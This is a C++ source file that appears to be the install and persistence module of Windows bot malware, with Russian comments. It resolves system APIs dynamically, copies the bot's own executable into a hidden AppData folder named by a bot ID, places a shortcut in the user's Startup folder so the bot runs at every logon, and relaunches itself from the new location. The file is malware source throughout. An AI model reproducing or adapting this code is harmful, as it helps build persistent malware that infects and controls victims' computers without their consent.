#include "../Config.h"
#include "Install.h"

/*
	Возвращает рабочую папку бота
*/
wchar_t* Install::GetMainPath()
{
	wchar_t* appData = (wchar_t*) hAlloc(MAX_PATH * sizeof(wchar_t));
	if (!appData) return nullptr;

	if ((API(SHELL32, SHGetFolderPathW)(NULL, CSIDL_APPDATA, NULL, 0, appData)) != S_OK)
	{
		 hFree(appData);
		return nullptr;
	}

	wchar_t* botUid =  GetBotUid();
	if (!botUid)
	{
		 hFree(appData);
		return nullptr;
	}

	API(KERNEL32, lstrcatW)(appData, L"\\");
	API(KERNEL32, lstrcatW)(appData, botUid);
	API(KERNEL32, lstrcatW)(appData, L"\\");

	if ( IsFileExist(appData)) return appData;
	else
	{
		API(KERNEL32, CreateDirectoryW)(appData, NULL);
		return appData;
	}

	return nullptr;
}

/*
	Возвращает путь до бинарника бота
*/
wchar_t* Install::GetInstallPath()
{
	wchar_t* mainPath = GetMainPath();
	if (!mainPath) return nullptr;

	wchar_t* botUid =  GetBotUid();
	if (!botUid) return nullptr;

	API(KERNEL32, lstrcatW)(mainPath, hide_install_path());
	API(KERNEL32, lstrcatW)(mainPath, L".exe");
	return mainPath;
}

/*
	Копирование бота в рабочую папку
*/
bool Install::MoveToInstallPath()
{
	wchar_t* installPath = GetInstallPath();
	if (!installPath) return false;
	
	if ( IsFileExist(installPath)) 
	{
		 hFree(installPath);
		return true;
	}

	HANDLE hSrcFile = API(KERNEL32, CreateFileW)(this->currentPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (!hSrcFile)
	{
		 hFree(installPath);
		return false;
	}

	DWORD srcFileSize = API(KERNEL32, GetFileSize)(hSrcFile, NULL);
	if (!srcFileSize)
	{
		 hFree(installPath);
		API(KERNEL32, CloseHandle)(hSrcFile);
		return false;
	}

	byte* fileBuffer = (byte*) hAlloc(srcFileSize);
	if (!fileBuffer)
	{
		 hFree(installPath);
		API(KERNEL32, CloseHandle)(hSrcFile);
		return false;
	}

	DWORD lpNumberOfBytesRead;
	if (!API(KERNEL32, ReadFile)(hSrcFile, fileBuffer, srcFileSize, &lpNumberOfBytesRead, NULL))
	{
		 hFree(installPath);
		API(KERNEL32, CloseHandle)(hSrcFile);
		 hFree(fileBuffer);
		return false;
	}
	API(KERNEL32, CloseHandle)(hSrcFile);

	HANDLE hDestFile = API(KERNEL32, CreateFileW)(installPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (!hDestFile)
	{
		 hFree(installPath);
		 hFree(fileBuffer);
		return false;
	}

	DWORD lpNumberOfBytesWritten;
	if (!API(KERNEL32, WriteFile)(hDestFile, fileBuffer, srcFileSize, &lpNumberOfBytesWritten, NULL))
	{
		 hFree(installPath);
		 hFree(fileBuffer);
		API(KERNEL32, CloseHandle)(hDestFile);
		return false;
	}

	if (srcFileSize == lpNumberOfBytesWritten)
	{
		 hFree(installPath);
		 hFree(fileBuffer);
		API(KERNEL32, CloseHandle)(hDestFile);
		return true;
	}

	 hFree(installPath);
	 hFree(fileBuffer);
	API(KERNEL32, CloseHandle)(hDestFile);

	return false;
}

/*
	Создание ярлыка в папке автозагрузки
*/
bool Install::AddAutorun()
{
	if (FAILED(API(OLE32, CoInitialize)(nullptr))) return false;

	IShellLinkW* psl;
	if (FAILED(API(OLE32, CoCreateInstance)(CLSID_ShellLink, nullptr, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (LPVOID*)&psl)))
	{
		API(OLE32, CoUninitialize)();
		return false;
	}

	wchar_t* installPath = GetInstallPath();
	if (!installPath)
	{
		psl->Release();
		API(OLE32, CoUninitialize)();
		return false;
	}

	if (FAILED(psl->SetPath(installPath)))
	{
		psl->Release();
		API(OLE32, CoUninitialize)();
		return false;
	}

	IPersistFile* ppf;
	if (FAILED(psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf)))
	{
		psl->Release();
		ppf->Release();
		API(OLE32, CoUninitialize)();
		return false;
	}
	psl->Release();

	wchar_t startupPath[MAX_PATH];
	if (FAILED(API(SHELL32, SHGetFolderPathW)(nullptr, CSIDL_STARTUP, nullptr, 0, startupPath)))
	{
		ppf->Release();
		API(OLE32, CoUninitialize)();
		return false;
	}

	API(KERNEL32, lstrcatW)(startupPath, StaticData::autorunLnkName);

	if (FAILED(ppf->Save(startupPath, TRUE)))
	{
		ppf->Release();
		API(OLE32, CoUninitialize)();
		return false;
	}

	ppf->Release();
	API(OLE32, CoUninitialize)();

	return true;
}

/*
	Перезапуск бота из рабочей папки
*/
void Install::Restart()
{
	wchar_t* installPath = GetInstallPath();
	if (!installPath) return;
	API(SHELL32, ShellExecuteW)(nullptr, nullptr, installPath, nullptr, nullptr, FALSE);
	API(KERNEL32, ExitProcess)(0);
}